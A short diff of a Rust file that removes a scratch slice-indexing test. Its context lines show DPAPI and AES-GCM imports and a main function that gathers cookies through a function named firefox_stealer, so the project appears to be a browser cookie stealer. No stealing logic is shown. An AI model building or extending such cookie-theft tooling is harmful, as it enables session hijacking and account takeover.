@@ -13,11 +13,6 @@ use winapi::um::wincrypt::CRYPTOAPI_BLOB;
 use aes_gcm::aead::{generic_array::GenericArray, Aead, NewAead};
 use aes_gcm::Aes256Gcm;
 
-fn _main() {
-    let fuckinvec = vec![1, 2, 3, 4, 5];
-    println!("{:?}", &fuckinvec[1..2]); // returns second element not second and third so it counts from 0 and doesn't return last
-}
-
 fn main() {
     let mut total_cookies: Vec<Vec<String>> = Vec::new();
     let mut ff_cookies = firefox_stealer();
